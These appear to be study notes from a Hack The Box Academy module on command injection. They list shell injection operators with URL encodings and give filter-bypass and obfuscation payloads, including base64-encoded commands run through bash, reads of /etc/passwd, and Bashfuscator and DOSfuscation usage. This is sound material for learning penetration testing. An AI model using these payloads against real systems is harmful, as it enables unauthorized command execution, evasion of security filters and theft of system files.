A Command Injection vulnerability allows us to `execute system commands` directly on the back-end hosting server, which could lead to compromising the entire network.
![Basic Exercise](https://academy.hackthebox.com/storage/modules/109/cmdinj_basic_exercise_2.jpg)

To inject an additional command to the intended one, we may use any of the following operators:

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | ;                       | %3b                       | Both                                       |
| New Line               | \n                      | %0a                       | Both                                       |
| Background             | &                       | %26                       | Both (second output generally shown first) |
| Pipe                   | \|                      | %7c                       | Both (only second output is shown)         |
| AND                    | &&                      | %26%26                    | Both (only if first succeeds)              |
| OR                     | \|\|                    | %7c%7c                    | Second (only if first fails)               |
| Sub-Shell              | ``                      | %60%60                    | Both (Linux-only)                          |
| Sub-Shell              | $()                     | %24%28%29                 | Both (Linux-only)                          |



# Bypassing Filters
## Bypassing Characters
If we see an error message saying `invalid input`, or if the error message displayed a different page with information like our IP and our request, this may indicate that it was denied by a WAF. We should try to identify which character caused the denied request.
- We'll need to bypass certain characters (`spaces, slash...`), we could refer to the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) page or [Hacktricks](https://book.hacktricks.wiki/sw/pentesting-web/command-injection.html).
## Bypassing Commands
Like bypassing single-character, certain commands might be blacklisted. We could try to obfuscate commands using characters within our command, like `'` or `"`.
```bash
# Work on Linux & Windows
w'h'o'am'i
w"h"o"am"i

# Linux only
who$@ami
w\ho\am\i

# Windows only
who^ami

# Case manipulation
WHOAMI
WhOaMi
# Case manipulation to bash shell which is case sensitive and must be all-lowercase
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")

# Reversed commands in Linux
echo 'whoami' | rev
$(rev<<<'imaohw')

# Reversed commands in Windows
"whoami"[-1..-20] -join ''
iex "$('imaohw'[-1..-20] -join '')"

# Encoded commands. Here we used b64 w/ a sub-shell ($()), but we can try other methods
echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

# Encoded commands in Windows
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
# If we're from linux and want to command inject a windows host, we'll need to convert the string from utf-8 to utf-16 first before we base64 it like this
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```
**Note:** We cannot mix types of quotes and their number must be even. Again for other techniques, we could refer to the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) page or [Hacktricks](https://book.hacktricks.wiki/sw/pentesting-web/command-injection.html).
If some commands were filtered, like `bash or base64`, we could try the character injection technique with the quotes !



# Automated
If we deal with advanced security tools, we might need to use `automated obfuscation` tools. 
## Linux
[Bashfuscator](https://github.com/Bashfuscator/Bashfuscator) can be used to obfuscate bash commands.
```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
cd ./bashfuscator/bin/
./bashfuscator -h

# Obfuscate a command with a random technique
./bashfuscator -c 'cat /etc/passwd'

# Obfuscate w/ a shorter and simplier form. We can test it w/ "bash -c 'obfuscated_command'"
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```
## Windows
[DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) can be used to obfuscate Windows commands.
```bash
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation

# Print the tutorial demo of the tool
Invoke-DOSfuscation> help

# Obfuscate a command
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```